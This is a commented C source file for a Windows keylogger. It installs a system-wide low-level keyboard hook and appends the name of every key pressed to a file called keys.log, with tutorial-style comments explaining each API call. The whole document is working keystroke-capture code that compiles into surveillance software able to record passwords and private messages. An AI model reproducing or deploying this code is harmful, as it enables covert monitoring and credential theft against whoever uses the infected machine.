// This code will only work if you have Windows NT or
// any later version installed, 2k and XP will work.
#define _WIN32_WINNT 0x0400
#include <windows.h>
#include <winuser.h>
#include <stdio.h>

// Global Hook handle
HHOOK hKeyHook;
// This is the function that is "exported" from the
// execuatable like any function is exported from a
// DLL. It is the hook handler routine for low level
// keyboard events.
__declspec(dllexport) LRESULT CALLBACK KeyEvent (
  int nCode,      // The hook code
  WPARAM wParam,  // The window message (WM_KEYUP, WM_KEYDOWN, etc.)
  LPARAM lParam   // A pointer to a struct with information about the pressed key
) {
    if  ((nCode == HC_ACTION) &&       // HC_ACTION means we may process this event
        ((wParam == WM_SYSKEYDOWN) ||  // Only react if either a system key ...
        (wParam == WM_KEYDOWN)))       // ... or a normal key have been pressed.
    {
    //  This struct contains various information about
    //  the pressed key such as hardware scan code, virtual
    //  key code and further flags.
        KBDLLHOOKSTRUCT hooked =
            *((KBDLLHOOKSTRUCT*)lParam);
    //  dwMsg shall contain the information that would be stored
    //  in the usual lParam argument of a WM_KEYDOWN message.
    //  All information like hardware scan code and other flags
    //  are stored within one double word at different bit offsets.
    //  Refer to MSDN for further information:
    //
    //  http://msdn.microsoft.com/library/en-us/winui/winui/
    //    windowsuserinterface/userinput/keyboardinput/aboutkeyboardinput.asp
    //
    //  (Keystroke Messages)
        DWORD dwMsg = 1;
        dwMsg += hooked.scanCode << 16;
        dwMsg += hooked.flags << 24;
    //  Call the GetKeyNameText() function to get the language-dependant
    //  name of the pressed key. This function should return the name
    //  of the pressed key in your language, aka the language used on
    //  the system.
        char lpszName[0x100] = {0};
        lpszName[0] = '[';
        int i = GetKeyNameText(dwMsg,
            (lpszName+1),0xFF) + 1;
        lpszName[i] = ']';
    //  Print this name to the standard console output device.
        FILE *file;
        file=fopen("keys.log","a+");
        fputs(lpszName,file);
        fflush(file);
    }
//  the return value of the CallNextHookEx routine is always
//  returned by your HookProc routine. This allows other
//  applications to install and handle the same hook as well.
    return CallNextHookEx(hKeyHook,
        nCode,wParam,lParam);
}
// This is a simple message loop that will be used
// to block while we are logging keys. It does not
// perform any real task ...
void MsgLoop()
{
    MSG message;
    while (GetMessage(&message,NULL,0,0)) {
        TranslateMessage( &message );
        DispatchMessage( &message );
    }
}
// This thread is started by the main routine to install
// the low level keyboard hook and start the message loop
// to loop forever while waiting for keyboard events.
DWORD WINAPI KeyLogger(LPVOID lpParameter)
{
//  Get a module handle to our own executable. Usually,
//  the return value of GetModuleHandle(NULL) should be
//  a valid handle to the current application instance,
//  but if it fails we will also try to actually load
//  ourself as a library. The thread's parameter is the
//  first command line argument which is the path to our
//  executable.
    HINSTANCE hExe = GetModuleHandle(NULL);
    if (!hExe) hExe = LoadLibrary((LPCSTR) lpParameter);
//  Everything failed, we can't install the hook ... this
//  never happened, but error handling is important.
    if (!hExe) return 1;
    hKeyHook = SetWindowsHookEx (  // install the hook:
        WH_KEYBOARD_LL,            // as a low level keyboard hook
        (HOOKPROC) KeyEvent,       // with the KeyEvent function from this executable
        hExe,                      // and the module handle to our own executable
        NULL                       // and finally, the hook should monitor all threads.
    );
//  Loop forever in a message loop and if the loop
//  stops some time, unhook the hook. I could have
//  added a signal handler for ctrl-c that unhooks
//  the hook once the application is terminated by
//  the user, but I was too lazy.
    MsgLoop();
    UnhookWindowsHookEx(hKeyHook);
    return 0;
}
// The main function just starts the thread that
// installs the keyboard hook and waits until it
// terminates.
int main(int argc, char** argv)
{
    HANDLE hThread;
    DWORD dwThread;
    DWORD exThread;
    hThread = CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)
        KeyLogger, (LPVOID) argv[0], NULL, &dwThread);
    if (hThread) {
        return WaitForSingleObject(hThread,INFINITE);
    } else {
        return 1;
    }
}
